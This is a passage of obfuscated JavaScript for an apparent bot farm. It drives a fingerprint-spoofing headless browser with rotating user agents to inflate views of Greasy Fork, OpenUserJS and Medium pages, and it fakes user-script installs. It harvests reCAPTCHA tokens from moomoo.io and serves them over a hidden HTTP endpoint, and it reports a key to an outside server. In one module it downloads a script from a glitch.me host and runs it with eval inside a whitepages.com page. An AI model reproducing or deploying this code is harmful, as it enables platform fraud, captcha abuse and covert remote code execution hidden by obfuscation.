      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + Z(0xe) + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + a1(0xd, '3uZu') + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + a0(0x1d) + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    Z(0x7) + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + Z(0x4) + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    a1(0x1b, '^#R&') + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    a1(0x15, 'tKY7') + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x1e4f + 0x1 * -0x1a52 + 0x3fd * -0x1
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x2 * 0x720 + 0x216d + -0x1 * 0x2fad)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x1a8 * 0x15 + 0x157a + 0xdb2), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x1 * 0xb79 + 0x61 * -0x7 + 0xe84), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const a2 = b,
          r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0xe * 0x1ff + 0x1ebd + -0x3aaf;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x769 * 0x1 + 0x1f7e + -0xf * 0x19b; w < getRandomInt(-0x1563 + 0x7 * -0x49c + 0x35a8, 0x3 * 0x469 + -0x1 * 0x58f + -0x7a7 * 0x1); w++)
            await u['keyboard'][a2(0x8, 'o2Sw')]('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0xdde1 + -0x1d2bd + 0x39afe);
        }
      }();
    }, 0x1 * 0x268a + 0x23e * -0xb + 0xd7c * -0x1), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0xeaf + 0x70 * -0x4d + 0x1301;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0xfbb + 0x100d + -0x52, 0xb * 0x29d + -0x319 + -0x9 * 0x2d4)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x4fef + -0xd244 * -0x1 + -0xad03);
    }, -0x4 * 0x208 + 0x1569 + -0xce5 * 0x1), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x26d7 + 0x1 * 0x74c + 0x1f8b;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0xc16 + -0x26ff + 0x26a1), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0xe3 * -0x2c + -0x66 * 0x20 + -0x1a44), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x5 * 0x26585 + -0x1575e4 + 0x2f2d1d);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0xef0 + -0x3 * 0xa4 + 0x1140);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x1076 + 0x1 * 0x14ae + -0x370);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x34b * 0xb + 0xa3 * -0x1 + 0x1 * 0x446c);
}
doFlags['doOUJS'] && ((async () => {
  const a5 = d,
    a4 = c;
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x174 * -0x8 + 0x117 * -0x1 + 0xcb8) {
        const a3 = d;
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0xd * 0x143 + 0x1e05 * 0x1 + -0x2e6b));
        const C = A['indexOf'](a3(0xa)) + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x1c2b + -0x759 + -0x14d2, D['indexOf']('\x20'));
        return B ? E['slice'](-0x12 * -0x11b + -0x26b5 + -0x5 * -0x3c3, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x2e2d + -0x3743 * 0x1 + 0x8c80),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x457b + -0xc6e * 0x1 + -0x11fd),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + a4(0x0) + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + a5(0x19) + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0xc5e + -0x1 * 0x264 + 0xec2 * 0x1; k < 0x1b6c + 0xb * -0x138 + -0x70 * 0x20; k++)
    setTimeout(f, (0x17457 + 0x65e9 + -0xca0 * 0x13) * k * getRandomInt(-0xc59 + 0x2134 + 0x9d * -0x22, 0x431 + -0x1082 + -0x20e * -0x6));
  setInterval(() => {
    f();
    for (let l = -0xedb + 0xb37 + 0x3a4; l < -0x994 * -0x3 + 0x1 * 0x13d6 + 0x9b6 * -0x5; l++)
      setTimeout(f, (0xde * 0x107 + 0x180c7 + -0xd * 0x1d1d) * l * getRandomInt(-0x1122 + -0x21b6 + 0x32d9 * 0x1, 0x1 * -0x605 + -0x23 * 0x15 + -0x35 * -0x2b));
  }, -0x1 * -0x288623 + 0x5a5f28 + 0x3b3 * -0x1489);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
